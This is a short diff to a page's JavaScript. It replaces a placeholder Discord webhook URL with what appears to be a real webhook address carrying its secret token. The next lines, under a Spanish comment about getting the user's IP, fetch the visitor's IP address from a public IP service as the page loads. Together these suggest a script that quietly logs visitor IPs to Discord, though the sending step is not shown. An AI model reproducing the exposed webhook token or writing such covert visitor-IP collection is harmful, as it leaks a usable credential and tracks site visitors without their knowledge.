@@ -29,7 +29,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    const webhookURL = 'https://discord.com/api/webhooks/TU-WEBHOOK-ID';
+    const webhookURL = 'https://discord.com/api/webhooks/1316790882808107101/CVjQeNxDisODGhjMq9AjWin0XcV_xKWOL1VX76Ynog-7sciWT-ZwTCf-84RFm56HS_IH';
 
     // --- Obtener la IP del usuario ---
     fetch('https://api.ipify.org?format=json')
